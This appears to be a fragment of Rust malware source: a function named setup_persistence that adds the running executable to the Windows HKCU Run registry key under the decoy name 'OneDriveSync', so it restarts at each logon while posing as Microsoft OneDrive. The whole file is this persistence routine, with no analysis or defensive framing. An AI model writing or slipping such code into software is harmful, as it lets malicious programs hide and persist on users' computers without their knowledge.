use winreg::RegKey;
use winreg::enums::*;

pub fn setup_persistence() {
    if cfg!(windows) {
        if let Ok(exe) = std::env::current_exe() {
            if let Some(path) = exe.to_str() {
                let hkcu = RegKey::predef(HKEY_CURRENT_USER);
                if let Ok((key, _)) = hkcu.create_subkey(r"Software\Microsoft\Windows\CurrentVersion\Run") {
                    let _ = key.set_value("OneDriveSync", &path);
                }
            }
        }
    }
}